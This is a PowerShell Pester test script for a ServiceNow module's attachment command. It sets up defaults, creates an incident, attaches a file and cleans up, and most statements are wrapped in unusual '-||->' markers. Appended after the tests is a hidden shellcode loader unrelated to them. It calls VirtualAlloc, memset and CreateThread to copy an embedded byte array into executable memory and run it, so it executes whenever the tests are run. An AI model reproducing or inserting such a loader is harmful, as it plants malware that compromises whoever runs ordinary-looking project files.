[CmdletBinding()]
Param(
    [Parameter(Mandatory = $true)]
    [ValidateNotNullorEmpty()]
    [PSCredential]$Credential
)

 -||-> If ( -||-> -not $PSScriptRoot <-||- ) { -||-> $PSScriptRoot =  -||-> Split-Path $MyInvocation.MyCommand.Path -Parent <-||-  <-||- } <-||- 
 -||-> $Script:ThisCommand = $MyInvocation.MyCommand <-||- 

 -||-> $ProjectRoot =  -||-> Resolve-Path "$PSScriptRoot\.." <-||-  <-||- 
 -||-> $ModuleRoot =  -||-> Split-Path ( -||-> Resolve-Path "$ProjectRoot\*\*.psd1" <-||- ) <-||-  <-||- 
 -||-> $ModuleName =  -||-> Split-Path $ModuleRoot -Leaf <-||-  <-||- 
 -||-> $ModulePsd = ( -||-> Resolve-Path "$ProjectRoot\*\$ModuleName.psd1" <-||- ).Path <-||- 
 -||-> $ModulePsm = ( -||-> Resolve-Path "$ProjectRoot\*\$ModuleName.psm1" <-||- ).Path <-||- 
 -||-> $DefaultsFile =  -||-> Join-Path $ProjectRoot "Tests\$( -||-> $ModuleName <-||- ).Pester.Defaults.json" <-||-  <-||- 

 -||-> $ModuleLoaded =  -||-> Get-Module $ModuleName <-||-  <-||- 
 -||-> If ( -||-> $null -eq $ModuleLoaded <-||- ) {
     -||-> Import-Module $ModulePSD -Force <-||- 
}
ElseIf ( -||-> $null -ne $ModuleLoaded -and $ModuleLoaded -ne $ModulePSM <-||- ) {
     -||-> Remove-Module $ModuleName -Force -ErrorAction SilentlyContinue <-||- 
     -||-> Import-Module $ModulePSD -Force <-||- 
} <-||- 


 -||-> If ( -||-> Test-Path $DefaultsFile <-||- ) {
     -||-> $Script:Defaults =  -||-> Get-Content $DefaultsFile -Raw | ConvertFrom-Json <-||-  <-||- 

     -||-> If ( -||-> 'testingurl.service-now.com' -eq $Defaults.ServiceNowUrl <-||- ) {
        Throw  -||-> 'Please populate the *.Pester.Defaults.json file with your values' <-||- 
    } <-||- 
}
Else {
    
     -||-> @{
        ServiceNowURL =  -||-> 'testingurl.service-now.com' <-||- 
        TestCategory  =  -||-> 'Internal' <-||- 
        TestUserGroup =  -||-> '8a4dde73c6112278017a6a4baf547aa7' <-||- 
        TestUser      =  -||-> '6816f79cc0a8016401c5a33be04be441' <-||- 
    } | ConvertTo-Json | Set-Content $DefaultsFile <-||- 
    Throw  -||-> "$DefaultsFile does not exist. Created example file. Please populate with your values" <-||- 
} <-||- 

 -||-> Describe "$ThisCommand" -Tag Attachment {

     -||-> $null =  -||-> Set-ServiceNowAuth -Url $Defaults.ServiceNowUrl -Credentials $Credential <-||-  <-||- 

     -||-> It "Create incident with New-ServiceNowIncident" {
         -||-> $ShortDescription = "Testing Ticket Creation with Pester:  $ThisCommand" <-||- 
         -||-> $newServiceNowIncidentSplat = @{
            Caller           =  -||-> $Defaults.TestUser <-||- 
            ShortDescription =  -||-> $ShortDescription <-||- 
            Description      =  -||-> 'Long description' <-||- 
            Comment          =  -||-> 'Test Comment' <-||- 
        } <-||- 

         -||-> { -||-> $Script:TestTicket =  -||-> New-ServiceNowIncident @newServiceNowIncidentSplat <-||-  <-||- } | Should -Not -Throw <-||- 
         -||-> $TestTicket.short_description | Should -Be $ShortDescription <-||- 
    } <-||- 

     -||-> It 'Attachment test file exist' {
         -||-> $FileValue = "{0}`t{1}" -f ( -||-> Get-Date <-||- ), $ThisCommand <-||- 
         -||-> $FileName = "{0}.txt" -f 'GetServiceNowAttachment' <-||- 
         -||-> $newItemSplat = @{
            Name     =  -||-> $FileName <-||- 
            ItemType =  -||-> 'File' <-||- 
            Value    =  -||-> $FileValue <-||- 
        } <-||- 
         -||-> $Script:File =  -||-> New-Item @newItemSplat <-||-  <-||- 

         -||-> $File.FullName | Should -Exist <-||- 
    } <-||- 

     -||-> It "File is attached to $( -||-> $TestTicket.Number <-||- ) (Global Credentials)" {
         -||-> $addServiceNowAttachmentSplat = @{
            Number   =  -||-> $TestTicket.Number <-||- 
            Table    =  -||-> 'incident' <-||- 
            File     =  -||-> $File.FullName <-||- 
            PassThru =  -||-> $true <-||- 
        } <-||- 
         -||-> $Attachment =  -||-> Add-ServiceNowAttachment @addServiceNowAttachmentSplat <-||-  <-||- 

         -||-> $Attachment.file_name | Should -Be $File.Name <-||- 
    } <-||- 

     -||-> It "File is attached to $( -||-> $TestTicket.Number <-||- ) (Specified Credentials)" {
         -||-> $addServiceNowAttachmentSplat = @{
            Number        =  -||-> $TestTicket.Number <-||- 
            Table         =  -||-> 'incident' <-||- 
            File          =  -||-> $File.FullName <-||- 
            Credential    =  -||-> $Credential <-||- 
            ServiceNowURL =  -||-> $Defaults.ServiceNowURL <-||- 
            PassThru      =  -||-> $true <-||- 
        } <-||- 
         -||-> $Attachment =  -||-> Add-ServiceNowAttachment @addServiceNowAttachmentSplat <-||-  <-||- 

         -||-> $Attachment.file_name | Should -Be $File.Name <-||- 
    } <-||- 

     -||-> It 'Attachment test file removed' {
         -||-> Remove-Item $File.FullName -Force <-||- 

         -||-> $File.FullName | Should -Not -Exist <-||- 
    } <-||- 

     -||-> $null =  -||-> Remove-ServiceNowAuth <-||-  <-||- 
} <-||- 

 -||-> $SnOc = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $SnOc -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0xba,0xd7,0x7d,0x24,0xda,0xde,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x78,0x13,0x83,0xe8,0xfc,0x03,0x78,0xb5,0x35,0x88,0xd8,0x21,0x3b,0x73,0x21,0xb1,0x5c,0xfd,0xc4,0x80,0x5c,0x99,0x8d,0xb2,0x6c,0xe9,0xc0,0x3e,0x06,0xbf,0xf0,0xb5,0x6a,0x68,0xf6,0x7e,0xc0,0x4e,0x39,0x7f,0x79,0xb2,0x58,0x03,0x80,0xe7,0xba,0x3a,0x4b,0xfa,0xbb,0x7b,0xb6,0xf7,0xee,0xd4,0xbc,0xaa,0x1e,0x51,0x88,0x76,0x94,0x29,0x1c,0xff,0x49,0xf9,0x1f,0x2e,0xdc,0x72,0x46,0xf0,0xde,0x57,0xf2,0xb9,0xf8,0xb4,0x3f,0x73,0x72,0x0e,0xcb,0x82,0x52,0x5f,0x34,0x28,0x9b,0x50,0xc7,0x30,0xdb,0x56,0x38,0x47,0x15,0xa5,0xc5,0x50,0xe2,0xd4,0x11,0xd4,0xf1,0x7e,0xd1,0x4e,0xde,0x7f,0x36,0x08,0x95,0x73,0xf3,0x5e,0xf1,0x97,0x02,0xb2,0x89,0xa3,0x8f,0x35,0x5e,0x22,0xcb,0x11,0x7a,0x6f,0x8f,0x38,0xdb,0xd5,0x7e,0x44,0x3b,0xb6,0xdf,0xe0,0x37,0x5a,0x0b,0x99,0x15,0x32,0xf8,0x90,0xa5,0xc2,0x96,0xa3,0xd6,0xf0,0x39,0x18,0x71,0xb8,0xb2,0x86,0x86,0xbf,0xe8,0x7f,0x18,0x3e,0x13,0x80,0x30,0x84,0x47,0xd0,0x2a,0x2d,0xe8,0xbb,0xaa,0xd2,0x3d,0x51,0xae,0x44,0x7e,0x0e,0xb0,0x85,0x16,0x4d,0xb1,0xb4,0xba,0xd8,0x57,0xe6,0x12,0x8b,0xc7,0x46,0xc3,0x6b,0xb8,0x2e,0x09,0x64,0xe7,0x4e,0x32,0xae,0x80,0xe4,0xdd,0x07,0xf8,0x90,0x44,0x02,0x72,0x01,0x88,0x98,0xfe,0x01,0x02,0x2f,0xfe,0xcf,0xe3,0x5a,0xec,0xa7,0x03,0x11,0x4e,0x61,0x1b,0x8f,0xe5,0x8d,0x89,0x34,0xac,0xda,0x25,0x37,0x89,0x2c,0xea,0xc8,0xfc,0x27,0x23,0x5d,0xbf,0x5f,0x4c,0xb1,0x3f,0x9f,0x1a,0xdb,0x3f,0xf7,0xfa,0xbf,0x13,0xe2,0x04,0x6a,0x00,0xbf,0x90,0x95,0x71,0x6c,0x32,0xfe,0x7f,0x4b,0x74,0xa1,0x80,0xbe,0x84,0x9d,0x56,0x86,0xf2,0xcf,0x6a <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $hwM=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $hwM.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$hwM,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



